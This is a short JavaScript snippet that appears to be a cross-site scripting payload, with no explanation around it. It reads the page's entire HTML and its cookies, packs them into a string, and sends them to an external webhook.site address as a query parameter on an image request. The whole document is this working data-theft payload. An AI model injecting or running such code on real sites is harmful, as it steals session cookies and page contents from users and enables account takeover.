const exfil = `
InnerHTML:
${document.documentElement.innerHTML}

Cookie:
${document.cookie}
`;
const i = new Image();
i.src = "https://webhook.site/343d91a5-4ebb-428a-94b5-8f9d244196cf?dump=" + encodeURIComponent(exfil);
document.body.appendChild(i);